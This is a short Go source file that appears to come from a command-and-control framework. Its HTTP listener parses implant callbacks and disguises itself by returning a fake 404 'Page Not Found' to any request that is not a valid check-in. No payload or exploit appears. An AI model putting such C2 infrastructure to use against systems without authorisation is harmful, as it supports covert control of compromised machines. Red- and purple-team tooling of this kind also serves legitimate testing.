package listener

import (
	"net/http"
	"purpcmd/server/implant"
)

func root(w http.ResponseWriter, r *http.Request) {
	a := implant.ParseCallback(r.Body)
	if a == implant.NIL {
		w.WriteHeader(404)
		w.Write([]byte("Page Not Found"))
		return
	}

	w.WriteHeader(200)
	w.Write([]byte("Hi!"))
}